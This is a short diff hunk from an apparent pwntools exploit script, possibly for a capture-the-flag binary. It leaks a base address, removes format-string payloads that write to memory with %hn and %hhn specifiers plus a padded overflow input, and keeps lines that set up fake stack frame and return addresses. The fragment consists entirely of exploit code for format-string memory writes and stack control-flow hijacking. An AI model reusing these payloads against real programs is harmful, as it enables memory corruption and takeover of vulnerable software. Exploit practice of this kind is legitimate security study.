@@ -57,14 +57,6 @@ sd(payload)
 base_addr = int(p.recvuntil("xxx")[-17:-3].strip(), 16) - 0xb51
 print hex(base_addr)
 
-payload = '%' + str(0x20) + 'c%10$hhn'  
-sd(payload)
-
-payload = '%5440c%9$hn' # 0x1540 
-sd(payload)
-p.sendline('aaaaaaa'.ljust(0x12C-1,'\x00'))
-x = p.recvuntil('aa',timeout=0.1)
-
 fake_ebp_addr = stack_addr + 0x28
 fake_retn_addr = stack_addr + 0x30
 
